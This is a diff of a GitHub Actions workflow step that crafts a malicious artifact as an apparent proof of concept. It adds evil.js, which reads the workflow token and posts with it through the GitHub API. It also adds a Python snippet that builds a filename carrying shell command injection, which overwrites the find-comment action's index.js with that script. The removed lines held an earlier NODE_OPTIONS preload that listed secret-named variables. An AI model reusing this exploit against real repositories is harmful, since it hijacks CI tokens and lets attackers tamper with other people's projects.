@@ -24,32 +24,34 @@ jobs:
           mkdir -p content
           printf '%s\n' "$PRNUM" > content/pr_number.txt
           printf 'plain report from artifact\n' > content/x.txt
-          printf 'NODE_OPTIONS=--require /tmp/content/content/p.js\n' > content/env.txt
-          cat > content/p.js <<'JS'
-          const fs = require('fs');
-          const t = process.env.INPUT_TOKEN || '';
-          const keys = Object.keys(process.env).filter(k => k.startsWith('INPUT_') || /TOKEN|SECRET|PAT/.test(k));
-          const line = 'GAB_PRELOAD_RAN token_len=' + t.length + ' action=' + (process.env.GITHUB_ACTION || '?') + ' keys=' + keys.join(',');
-          console.log(line);
-          try { fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY || '/tmp/summary.txt', line + '\n'); } catch (e) {}
-          const pr = 'PRNUM';
-          if (t && pr !== '0') {
-            fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + pr + '/comments', {
-              method: 'POST',
-              headers: { authorization: 'Bearer ' + t, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
-              body: JSON.stringify({ body: 'GAB_RCE_PROOF: node preload executed inside the PR Comment workflow. token_len=' + t.length })
-            }).then(r => console.log('GAB_COMMENT_STATUS ' + r.status)).catch(e => console.log('GAB_COMMENT_ERR ' + e.message));
-          }
+          cat > content/evil.js <<'JS'
+          (async () => {
+            const t = process.env.INPUT_TOKEN || '';
+            console.log('GAB_TOKEN_STOLEN len=' + t.length + ' action=' + (process.env.GITHUB_ACTION || '?'));
+            if (t) {
+              try {
+                const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + (process.env.GAB_TARGET || '8') + '/comments', {
+                  method: 'POST',
+                  headers: { authorization: 'Bearer ' + t, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
+                  body: JSON.stringify({ body: 'GAB_TOKEN_STOLEN: code injected into the find-comment action executed with the workflow token (len=' + t.length + ')' })
+                });
+                console.log('GAB_STATUS ' + r.status);
+              } catch (e) { console.log('GAB_ERR ' + e.message); }
+            }
+            process.exit(0);
+          })();
           JS
-          sed -i "s|PRNUM|$PRNUM|" content/p.js
           python3 - <<'PY'
           import os
-          ups = ";".join(["cd${IFS}.."] * 8)
-          inj = "$(" + ups + ";cd${IFS}tmp;cd${IFS}content;cd${IFS}content;cp${IFS}env.txt${IFS}$GITHUB_ENV)"
+          u = "$IFS"
+          src = ";".join(["cd"+u+".."]*5 + ["cd"+u+"tmp", "cd"+u+"content", "cd"+u+"content"])
+          dst = ";".join(["cd"+u+"$RUNNER_WORKSPACE", "cd"+u+"..", "cd"+u+"_actions", "cd"+u+"peter-evans",
+                          "cd"+u+"find-comment", "cd"+u+"v3", "cd"+u+"dist", "realpath"+u+"index.js"])
+          inj = "$(" + src + ";cp" + u + "evil.js" + u + "$(" + dst + "))"
           name = "x" + inj + ".txt"
           with open(os.path.join("content", name), "w") as f:
               f.write("injection carrier\n")
-          print("created", name, len(name))
+          print("created", len(name), name)
           PY
           ls -la content
       - uses: actions/upload-artifact@v4
